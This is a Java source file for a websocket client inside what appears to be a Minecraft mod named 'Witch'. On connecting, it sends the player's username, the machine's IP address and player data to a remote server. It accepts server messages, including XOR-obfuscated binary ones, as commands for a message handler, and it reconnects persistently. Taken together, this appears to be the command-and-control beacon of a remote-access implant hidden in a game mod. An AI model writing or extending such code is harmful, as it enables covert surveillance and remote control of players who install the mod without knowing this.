package me.soda.witch.websocket;

import com.google.gson.Gson;
import me.soda.witch.Witch;
import me.soda.witch.features.NetUtil;
import me.soda.witch.features.PlayerInfo;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.nio.ByteBuffer;

import static me.soda.witch.Witch.mc;

public class WSClient extends WebSocketClient {
    public static int reconnections = 0;
    private static boolean reconnect = true;

    public WSClient(URI serverURI) {
        super(serverURI);
    }

    @Override
    public void onOpen(ServerHandshake handshakeData) {
        Witch.println("Connection initialized");
        String greetingMsg = "Reconnected " + reconnections + " times, I am " + mc.getSession().getUsername();
        MessageUtils.sendMessage("greeting", greetingMsg);
        if (Witch.ip == null) Witch.ip = NetUtil.getIp();
        MessageUtils.sendMessage("player", new Gson().toJson(new PlayerInfo(Witch.mc.player)));
    }

    @Override
    public void onMessage(String message) {
        MessageHandler.handle(message);
    }

    @Override
    public void onMessage(ByteBuffer bytes) {
        MessageHandler.handle(MessageUtils.xor.decrypt(bytes.array()));
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        if (reconnect ? reconnect : reconnections > 10) {
            Witch.tryReconnect(this::reconnect);
            reconnections++;
        } else {
            Witch.println("Witch end because of manual shutdown");
        }
    }

    @Override
    public void onError(Exception e) {
        Witch.printStackTrace(e);
    }

    public void close(boolean reconnect) {
        WSClient.reconnect = reconnect;
        this.close();
    }
}